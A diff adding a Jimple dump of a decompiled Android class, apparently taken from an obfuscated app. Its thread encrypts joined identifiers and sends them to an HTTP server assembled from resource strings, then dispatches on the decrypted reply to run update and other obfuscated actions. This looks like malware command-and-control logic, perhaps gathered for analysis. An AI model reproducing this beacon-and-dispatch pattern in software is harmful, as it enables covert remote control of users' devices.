@@ -1,0 +1,170 @@
+class com.xxx.yyy.qzl$1 extends java.lang.Thread
+{
+    final com.xxx.yyy.qzl this$0;
+
+    void <init>(com.xxx.yyy.qzl)
+    {
+        com.xxx.yyy.qzl$1 r0;
+        com.xxx.yyy.qzl r1;
+
+        r0 := @this: com.xxx.yyy.qzl$1;
+        r1 := @parameter0: com.xxx.yyy.qzl;
+        r0.<com.xxx.yyy.qzl$1: com.xxx.yyy.qzl this$0> = r1;
+        specialinvoke r0.<java.lang.Thread: void <init>()>();
+        return;
+    }
+
+    public void run()
+    {
+        com.xxx.yyy.qzl$1 r0;
+        java.lang.String r1, r2, $r5, $r6, $r9, $r16, $r20, $r22, $r24, $r29, $r33, $r37, $r41, $r44, r45, $r47, r48, r49, $r54, $r57, $r59, $r62, $r66, $r71;
+        java.lang.StringBuilder $r3, $r7, $r10, $r11, $r13, $r14, $r17, $r18, $r21, $r26, $r30, $r34, $r38, $r42, $r43;
+        com.xxx.yyy.qzl $r4, $r8, $r12, $r15, $r19, $r23, $r25, $r27, $r31, $r35, $r39, $r46, $r51, $r53, $r56, $r58, $r60, $r61, $r63, $r65, $r68, $r70;
+        int $i0, $i1, $i3, $i4;
+        android.content.Context $r28, $r32, $r36, $r40, $r52, $r64, $r69;
+        char $c2;
+        com.xxx.yyy.ssmm $r50;
+        com.xxx.yyy.adad $r55;
+        com.xxx.yyy.UpdateHelper $r67;
+        java.lang.Exception $r72, r73, $r74, r75;
+
+        r0 := @this: com.xxx.yyy.qzl$1;
+        r1 = "";
+
+     label0:
+        $r3 = new java.lang.StringBuilder;
+        $r4 = r0.<com.xxx.yyy.qzl$1: com.xxx.yyy.qzl this$0>;
+        $r5 = staticinvoke <com.xxx.yyy.qzl: java.lang.String access$0(com.xxx.yyy.qzl)>($r4);
+        $r6 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r5);
+        specialinvoke $r3.<java.lang.StringBuilder: void <init>(java.lang.String)>($r6);
+        $r7 = virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&");
+        $r8 = r0.<com.xxx.yyy.qzl$1: com.xxx.yyy.qzl this$0>;
+        $r9 = staticinvoke <com.xxx.yyy.qzl: java.lang.String access$1(com.xxx.yyy.qzl)>($r8);
+        $r10 = virtualinvoke $r7.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r9);
+        $r11 = virtualinvoke $r10.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&");
+        $r12 = r0.<com.xxx.yyy.qzl$1: com.xxx.yyy.qzl this$0>;
+        $i0 = $r12.<com.xxx.yyy.qzl: int netway>;
+        $r13 = virtualinvoke $r11.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0);
+        $r14 = virtualinvoke $r13.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&");
+        $r15 = r0.<com.xxx.yyy.qzl$1: com.xxx.yyy.qzl this$0>;
+        $r16 = staticinvoke <com.xxx.yyy.qzl: java.lang.String access$2(com.xxx.yyy.qzl)>($r15);
+        $r17 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16);
+        $r18 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&");
+        $r19 = r0.<com.xxx.yyy.qzl$1: com.xxx.yyy.qzl this$0>;
+        $r20 = staticinvoke <com.xxx.yyy.qzl: java.lang.String access$3(com.xxx.yyy.qzl)>($r19);
+        $r21 = virtualinvoke $r18.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20);
+        $r22 = virtualinvoke $r21.<java.lang.StringBuilder: java.lang.String toString()>();
+        $r23 = r0.<com.xxx.yyy.qzl$1: com.xxx.yyy.qzl this$0>;
+        $r24 = staticinvoke <com.xxx.yyy.qzl: java.lang.String access$4(com.xxx.yyy.qzl)>($r23);
+        r2 = staticinvoke <com.xxx.yyy.ddda: java.lang.String encrypt(java.lang.String,java.lang.String)>($r22, $r24);
+
+     label1:
+        r1 = r2;
+
+     label2:
+        $r25 = r0.<com.xxx.yyy.qzl$1: com.xxx.yyy.qzl this$0>;
+        $r26 = new java.lang.StringBuilder;
+        specialinvoke $r26.<java.lang.StringBuilder: void <init>(java.lang.String)>("http://");
+        $r27 = r0.<com.xxx.yyy.qzl$1: com.xxx.yyy.qzl this$0>;
+        $r28 = staticinvoke <com.xxx.yyy.qzl: android.content.Context access$5(com.xxx.yyy.qzl)>($r27);
+        $r29 = virtualinvoke $r28.<android.content.Context: java.lang.String getString(int)>(2131034145);
+        $r30 = virtualinvoke $r26.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r29);
+        $r31 = r0.<com.xxx.yyy.qzl$1: com.xxx.yyy.qzl this$0>;
+        $r32 = staticinvoke <com.xxx.yyy.qzl: android.content.Context access$5(com.xxx.yyy.qzl)>($r31);
+        $r33 = virtualinvoke $r32.<android.content.Context: java.lang.String getString(int)>(2131034147);
+        $r34 = virtualinvoke $r30.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r33);
+        $r35 = r0.<com.xxx.yyy.qzl$1: com.xxx.yyy.qzl this$0>;
+        $r36 = staticinvoke <com.xxx.yyy.qzl: android.content.Context access$5(com.xxx.yyy.qzl)>($r35);
+        $r37 = virtualinvoke $r36.<android.content.Context: java.lang.String getString(int)>(2131034149);
+        $r38 = virtualinvoke $r34.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r37);
+        $r39 = r0.<com.xxx.yyy.qzl$1: com.xxx.yyy.qzl this$0>;
+        $r40 = staticinvoke <com.xxx.yyy.qzl: android.content.Context access$5(com.xxx.yyy.qzl)>($r39);
+        $r41 = virtualinvoke $r40.<android.content.Context: java.lang.String getString(int)>(2131034151);
+        $r42 = virtualinvoke $r38.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r41);
+        $r43 = virtualinvoke $r42.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r1);
+        $r44 = virtualinvoke $r43.<java.lang.StringBuilder: java.lang.String toString()>();
+        r45 = staticinvoke <com.xxx.yyy.qzl: java.lang.String access$6(com.xxx.yyy.qzl,java.lang.String)>($r25, $r44);
+
+     label3:
+        $r46 = r0.<com.xxx.yyy.qzl$1: com.xxx.yyy.qzl this$0>;
+        $r47 = staticinvoke <com.xxx.yyy.qzl: java.lang.String access$4(com.xxx.yyy.qzl)>($r46);
+        r48 = staticinvoke <com.xxx.yyy.ddda: java.lang.String decrypt(java.lang.String,java.lang.String)>(r45, $r47);
+
+     label4:
+        r45 = r48;
+
+     label5:
+        $i1 = virtualinvoke r45.<java.lang.String: int length()>();
+        if $i1 <= 0 goto label6;
+
+        $c2 = virtualinvoke r45.<java.lang.String: char charAt(int)>(1);
+        tableswitch($c2)
+        {
+            case 48: goto label7;
+            case 49: goto label8;
+            case 50: goto label9;
+            case 51: goto label10;
+            default: goto label6;
+        };
+
+     label6:
+        return;
+
+     label7:
+        r49 = virtualinvoke r45.<java.lang.String: java.lang.String substring(int)>(2);
+        $r50 = new com.xxx.yyy.ssmm;
+        specialinvoke $r50.<com.xxx.yyy.ssmm: void <init>()>();
+        $r51 = r0.<com.xxx.yyy.qzl$1: com.xxx.yyy.qzl this$0>;
+        $r52 = staticinvoke <com.xxx.yyy.qzl: android.content.Context access$5(com.xxx.yyy.qzl)>($r51);
+        $r53 = r0.<com.xxx.yyy.qzl$1: com.xxx.yyy.qzl this$0>;
+        $r54 = staticinvoke <com.xxx.yyy.qzl: java.lang.String access$1(com.xxx.yyy.qzl)>($r53);
+        virtualinvoke $r50.<com.xxx.yyy.ssmm: void Gef(android.content.Context,java.lang.String,java.lang.String)>($r52, r49, $r54);
+        return;
+
+     label8:
+        $r55 = new com.xxx.yyy.adad;
+        $r56 = r0.<com.xxx.yyy.qzl$1: com.xxx.yyy.qzl this$0>;
+        $r57 = staticinvoke <com.xxx.yyy.qzl: java.lang.String access$1(com.xxx.yyy.qzl)>($r56);
+        $r58 = r0.<com.xxx.yyy.qzl$1: com.xxx.yyy.qzl this$0>;
+        $r59 = staticinvoke <com.xxx.yyy.qzl: java.lang.String access$0(com.xxx.yyy.qzl)>($r58);
+        $r60 = r0.<com.xxx.yyy.qzl$1: com.xxx.yyy.qzl this$0>;
+        $i3 = $r60.<com.xxx.yyy.qzl: int netway>;
+        $r61 = r0.<com.xxx.yyy.qzl$1: com.xxx.yyy.qzl this$0>;
+        $r62 = staticinvoke <com.xxx.yyy.qzl: java.lang.String access$4(com.xxx.yyy.qzl)>($r61);
+        $r63 = r0.<com.xxx.yyy.qzl$1: com.xxx.yyy.qzl this$0>;
+        $r64 = staticinvoke <com.xxx.yyy.qzl: android.content.Context access$5(com.xxx.yyy.qzl)>($r63);
+        specialinvoke $r55.<com.xxx.yyy.adad: void <init>(java.lang.String,java.lang.String,int,java.lang.String,android.content.Context)>($r57, $r59, $i3, $r62, $r64);
+        virtualinvoke $r55.<com.xxx.yyy.adad: void StartGo()>();
+        return;
+
+     label9:
+        $r65 = r0.<com.xxx.yyy.qzl$1: com.xxx.yyy.qzl this$0>;
+        $r66 = virtualinvoke r45.<java.lang.String: java.lang.String substring(int)>(2);
+        staticinvoke <com.xxx.yyy.qzl: void access$7(com.xxx.yyy.qzl,java.lang.String)>($r65, $r66);
+        return;
+
+     label10:
+        $r67 = new com.xxx.yyy.UpdateHelper;
+        $r68 = r0.<com.xxx.yyy.qzl$1: com.xxx.yyy.qzl this$0>;
+        $r69 = staticinvoke <com.xxx.yyy.qzl: android.content.Context access$5(com.xxx.yyy.qzl)>($r68);
+        $r70 = r0.<com.xxx.yyy.qzl$1: com.xxx.yyy.qzl this$0>;
+        $i4 = $r70.<com.xxx.yyy.qzl: int netway>;
+        specialinvoke $r67.<com.xxx.yyy.UpdateHelper: void <init>(android.content.Context,int)>($r69, $i4);
+        $r71 = virtualinvoke r45.<java.lang.String: java.lang.String substring(int)>(2);
+        virtualinvoke $r67.<com.xxx.yyy.UpdateHelper: void Doit(java.lang.String)>($r71);
+        return;
+
+     label11:
+        $r72 := @caughtexception;
+        r73 = $r72;
+        goto label5;
+
+     label12:
+        $r74 := @caughtexception;
+        r75 = $r74;
+        goto label2;
+
+        catch java.lang.Exception from label0 to label1 with label12;
+        catch java.lang.Exception from label3 to label4 with label11;
+    }
+}
